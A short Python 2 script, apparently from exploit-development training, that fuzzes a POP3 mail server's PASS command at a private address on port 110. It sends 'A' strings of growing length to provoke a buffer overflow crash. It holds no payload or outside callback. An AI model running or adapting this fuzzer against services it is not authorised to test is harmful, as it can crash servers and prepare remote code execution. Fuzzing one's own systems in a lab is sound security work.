#!/usr/bin/python
import socket

# Create an array of buffers, while incrementing them.
buffer=["A"]
counter=100
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+200

try:
  for string in buffer:
    print "Fuzzing PASS with %s bytes" % len(string)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)		# create our socket
    connect=s.connect(('192.168.0.45',110))								# connect to mailserver on 110
    s.recv(1024)																					# get banner
    s.send('USER test\r\n')																# send username "test"
    s.recv(1024)																					# get reply
    s.send('PASS ' + string + '\r\n')											# send 'string' pwd
    s.send('QUIT\r\n')																		# quit and carry on
    s.close()																							# close socket
except:
  print "Something went wrong..."

